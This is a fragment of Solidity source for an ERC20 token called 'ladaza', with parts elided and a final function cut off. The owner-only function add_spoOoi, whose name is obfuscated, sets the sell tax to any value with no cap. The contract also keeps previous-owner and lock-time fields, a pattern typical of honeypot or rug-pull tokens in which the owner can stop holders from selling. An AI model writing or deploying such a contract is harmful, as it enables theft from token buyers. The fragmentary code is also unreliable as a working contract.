...
contract ladaza is ERC20 {
    uint256 public sellTax;
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;
    constructor() ERC20("DLDZ", "ladaza") {
        _mint(msg.sender, 78000000000);
        sellTax = 5;
        _owner = msg.sender;
    ...
    function add_spoOoi(uint256 amount) public onlyOwner {
        sellTax = amount;
    }
    
    function add_IgqVat() public {
